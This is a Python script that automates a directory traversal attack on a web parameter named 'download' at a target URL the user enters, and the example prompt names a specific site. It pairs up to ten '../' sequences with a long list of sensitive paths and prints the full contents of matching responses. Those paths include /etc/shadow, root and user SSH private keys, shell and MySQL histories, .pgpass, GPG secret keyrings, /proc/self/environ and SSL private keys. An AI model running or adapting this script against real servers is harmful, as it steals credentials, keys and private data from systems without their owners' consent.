import requests

def test_directory_traversal(url, param, payloads):
    """
    Test a URL for directory traversal vulnerability with multiple payloads.
    :param url: The base URL to test.
    :param param: The parameter to manipulate.
    :param payloads: A list of traversal payloads to use.
    :return: A dictionary with payloads, their status codes, and response content.
    """
    results = {}
    for payload in payloads:
        full_url = f"{url}?{param}={payload}"
        response = requests.get(full_url)
        results[payload] = {
            'status_code': response.status_code,
            'content': response.text
        }
    return results

# Generate a list of directory traversal sequences
def generate_payloads(base_files, depth=10, max_payloads=200):
    payloads = []
    for i in range(depth):
        traversal = "../" * i
        for base_file in base_files:
            payload = traversal + base_file
            payloads.append(payload)
            if len(payloads) >= max_payloads:
                return payloads
    return payloads

# Extended base_files list with more sensitive paths
base_files = [
    "etc/passwd",
    "etc/shadow",
    "var/log/apache2/access.log",
    "var/log/apache2/error.log",
    "var/log/httpd/access.log",
    "var/log/httpd/error.log",
    "var/www/html/index.php",
    "var/www/html/config.php",
    "usr/local/etc/nginx/nginx.conf",
    "usr/local/etc/httpd/httpd.conf",
    "home/user/.ssh/id_rsa",
    "home/user/.ssh/id_rsa.pub",
    "home/user/.bash_history",
    "home/user/.zsh_history",
    "home/user/.mysql_history",
    "home/user/.pgpass",
    "home/user/.gnupg/secring.gpg",
    "home/user/.gnupg/pubring.gpg",
    "root/.ssh/id_rsa",
    "root/.ssh/id_rsa.pub",
    "root/.bash_history",
    "root/.zsh_history",
    "root/.mysql_history",
    "root/.pgpass",
    "root/.gnupg/secring.gpg",
    "root/.gnupg/pubring.gpg",
    "proc/self/environ",
    "proc/version",
    "proc/cpuinfo",
    "proc/meminfo",
    "proc/self/cmdline",
    "etc/hosts",
    "etc/hostname",
    "etc/network/interfaces",
    "etc/sysctl.conf",
    "etc/motd",
    "etc/issue",
    "etc/resolv.conf",
    "etc/nginx/nginx.conf",
    "etc/httpd/conf/httpd.conf",
    "etc/httpd/conf.d/vhost.conf",
    "etc/httpd/logs/access_log",
    "etc/httpd/logs/error_log",
    "etc/httpd/logs/access.log",
    "etc/httpd/logs/error.log",
    "etc/apache2/apache2.conf",
    "etc/apache2/httpd.conf",
    "etc/apache2/ports.conf",
    "etc/apache2/sites-available/000-default.conf",
    "etc/apache2/sites-available/default-ssl.conf",
    "etc/mysql/my.cnf",
    "etc/my.cnf",
    "etc/my.cnf.d",
    "etc/ssl/private/ssl-cert-snakeoil.key",
    "etc/ssl/certs/ssl-cert-snakeoil.pem",
    "etc/php5/apache2/php.ini",
    "etc/php5/cli/php.ini",
    "var/lib/mlocate/mlocate.db",
    "var/log/boot.log",
    "var/log/auth.log",
    "var/log/syslog",
    "var/log/kern.log",
    "var/log/faillog",
    "var/log/lastlog",
    "var/log/dmesg",
    "var/log/maillog",
    "var/log/mail.log",
    "var/log/user.log",
    "var/log/messages",
    "var/log/secure",
    "var/log/debug",
    "var/log/lpr.log",
    "var/log/cron.log",
    "var/log/qmail/",
    "var/log/setuid.yyyymmdd",
    "var/log/setuid.today",
    "var/log/setuid.yesterday",
    "var/log/setuid",
    "var/log/audit/audit.log",
    "var/spool/cron/crontabs/root",
    "var/spool/cron/crontabs/",
    "var/spool/cron/",
    "var/mail/",
    "var/spool/mail/",
    "var/tmp/",
    "var/backups/",
    "var/cache/",
    "var/lock/",
    "var/run/",
    "var/tmp/",
    "var/opt/",
    "boot/grub/grub.cfg",
    "boot/grub2/grub.cfg",
    "boot/initrd.img",
    "boot/initrd.img.old",
    "boot/vmlinuz",
    "boot/vmlinuz.old",
    "home/user/.viminfo",
    "root/.viminfo",
    "root/.profile",
    "home/user/.profile",
    "home/user/.bashrc",
    "root/.bashrc",
    "home/user/.cshrc",
    "root/.cshrc",
    "home/user/.kshrc",
    "root/.kshrc",
    "home/user/.login",
    "root/.login",
    "root/.bash_logout",
    "home/user/.bash_logout",
    "etc/default/",
    "etc/rc.d/",
    "etc/rc.d/init.d/",
    "etc/init.d/",
    "etc/init/",
    "etc/systemd/",
    "etc/systemd/system/",
    "etc/systemd/system/default.target",
    "etc/systemd/system/multi-user.target",
    "etc/systemd/system/graphical.target",
    "etc/systemd/system/rescue.target",
    "etc/systemd/system/emergency.target",
    "etc/systemd/system/hibernate.target",
    "etc/systemd/system/suspend.target",
    "etc/systemd/system/hybrid-sleep.target",
    "etc/systemd/system/reboot.target",
    "etc/systemd/system/poweroff.target",
    "etc/systemd/system/runlevel0.target",
    "etc/systemd/system/runlevel1.target",
    "etc/systemd/system/runlevel2.target",
    "etc/systemd/system/runlevel3.target",
    "etc/systemd/system/runlevel4.target",
    "etc/systemd/system/runlevel5.target",
    "etc/systemd/system/runlevel6.target"
]

# Input the target URL and parameter
base_url = input("Enter the target website URL (e.g., https://www.eduitsc.com/): ")
parameter = "download"

payloads = generate_payloads(base_files)
response_contents = test_directory_traversal(base_url, parameter, payloads)

# Filter the results based on status codes
filtered_status_code = int(input("Enter the status code to filter (e.g., 200, 404, 403): "))
filtered_responses = {k: v for k, v in response_contents.items() if v['status_code'] == filtered_status_code}

# Print the filtered responses
for payload, details in filtered_responses.items():
    print(f"Payload: {payload}\nStatus Code: {details['status_code']}\nResponse:\n{details['content']}\n{'-'*80}")